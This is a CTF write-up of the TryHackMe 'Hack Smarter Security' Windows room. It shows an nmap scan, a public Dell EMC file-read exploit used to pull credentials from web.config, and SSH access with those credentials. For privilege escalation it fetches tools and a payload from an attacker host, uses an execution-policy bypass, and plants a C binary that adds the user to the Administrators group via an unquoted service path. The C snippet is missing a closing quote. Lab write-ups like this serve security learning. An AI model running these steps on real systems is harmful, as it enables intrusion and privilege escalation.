---
title: "Hack Smarter Security"
date: 2025-07-02
draft: false
summary: "Writeup for Hack Smarter Security CTF challenge on TryHackMe."
tags: ["windows", "lfr", "hardcoded creds", "unquoted service path"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/hacksmartersecurity/cover.webp"
  caption: "Hack Smarter Security TryHackMe Challenge"
  alt: "Hack Smarter Security cover"
platform: "TryHackMe"
---

Can you hack the hackers?
<!--more-->
To access the machine, click on the link given below:
- https://tryhackme.com/room/hacksmartersecurity

## Reconnaissance

I performed an **nmap** aggressive scan to reveal open ports and the services running on them.

```shell
nmap -A -p- TARGET --min-rate 10000 -oN hacksmart.nmap
```

| **Port** | **Service** |
| -------- | ----------- |
| 21       | ftp         |
| 22       | ssh         |
| 80       | http        |
| 1311     | https       |
| 3389     | rdp         |
| 7680     | p2p sharing |

![](https://cdn.ziomsec.com/hacksmartersecurity/1.webp)

![](https://cdn.ziomsec.com/hacksmartersecurity/2.webp)

![](https://cdn.ziomsec.com/hacksmartersecurity/3.webp)

## Initial Foothold

The **nmap** scan revealed a web server running on port 80 and port 1311. So I accessed them using my browser. 

![](https://cdn.ziomsec.com/hacksmartersecurity/4.webp)

I found a dell emc login panel where the `?` button also revealed its version

![](https://cdn.ziomsec.com/hacksmartersecurity/5.webp)

![](https://cdn.ziomsec.com/hacksmartersecurity/6.webp)

I searched for exploits for dell emc 9.4.0.2 and found a file read vulnerability. This vulnerability allowed an unauthenticated attacker to read files from a system.

![](https://cdn.ziomsec.com/hacksmartersecurity/7.webp)

I also found a PoC for it on github and downloaded it:
- https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2020-5377_CVE-2021-21514

I then ran the exploit and tried reading the default configuration file on IIS servers.

```shell
python CVE-2020-5377.py ATTACKER TARGET:PORT
> /windows/win.ini
```

![](https://cdn.ziomsec.com/hacksmartersecurity/8.webp)

Since that was successful, I read the **web.config**.

```shell
> /inetpub/wwwroot/hacksmartersec/web.config
```

![](https://cdn.ziomsec.com/hacksmartersecurity/9.webp)

Here, I found credentials that could be used to log in through **ssh**

```shell
ssh tyler@TARGET
```

![](https://cdn.ziomsec.com/hacksmartersecurity/10.webp)

Finally, I captured the user flag from Desktop.

```shell
cd Desktop
more user.txt
```

![](https://cdn.ziomsec.com/hacksmartersecurity/11.webp)

## Privilege Escalation

I downloaded and tried running **winPEAS**, **PowerUp** but both of them got blocked by firewall. So, I downloaded `PrivescCheck` and ran it to get attack paths.

```shell
iwr http://ATTACKER/PrivescCheck.ps1 -OutFile OUTPATH
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```

![](https://cdn.ziomsec.com/hacksmartersecurity/12.webp)

Here I found a binary with **Unquoted Service Path**.

![](https://cdn.ziomsec.com/hacksmartersecurity/13.webp)

I queried the service using **sc.exe** to validate the findings.

```shell
sc.exe qc spoofer-scheduler
sc.exe query spoofer-scheduler
```

![](https://cdn.ziomsec.com/hacksmartersecurity/14.webp)

I then looked for my permissions on the path and found I had full control over the service folder.

```shell
cacls "C:\Program Files (x86)\Spoofer\"
```

![](https://cdn.ziomsec.com/hacksmartersecurity/15.webp)

At first, I created and tried executing an **msfvenom** payload but it got blocked by firewall. So, I created a simple binary using **c** to add my current user to the local administrators group.

```c
#include <stdlib.h>

int main(){
	system("cmd.exe /c net localgroup Administrators tyler /add);
	return 0;
}
```

![](https://cdn.ziomsec.com/hacksmartersecurity/16.webp)

```shell
x86_64-w64-mingw32-gcc-win32 FILE.x -o spoofer-scheduler.exe
```

![](https://cdn.ziomsec.com/hacksmartersecurity/17.webp)

I downloaded this payload on the target, stopped the service, replaced the original service binary with my payload, started the service and then reloaded the system.

```sgekk
sc.exe stop spoofer-scheduler

move spoofer-scheduler.exe spoofer-scheduler.exe.bak

iwr http://ATTACKER/spoofer-scheduler.exe -OutFile 'C:\Program Files (x86)\Spoofer\spoofer-scheduler.exe'

reload

sc.exe start spoofer-scheduler
```


![](https://cdn.ziomsec.com/hacksmartersecurity/18.webp)

![](https://cdn.ziomsec.com/hacksmartersecurity/19.webp)

I then exited the **ssh** session and started a new one. I was successfully added to the local administrators group.

![](https://cdn.ziomsec.com/hacksmartersecurity/20.webp)

I then captured the root flag from *Administrator*'s Desktop.

```shell
more C:\Users\Administrator\Desktop\Hacking-Targets\hacking*.txt
```

![](https://cdn.ziomsec.com/hacksmartersecurity/21.webp)

That's it from my side!
Until next time :)

---
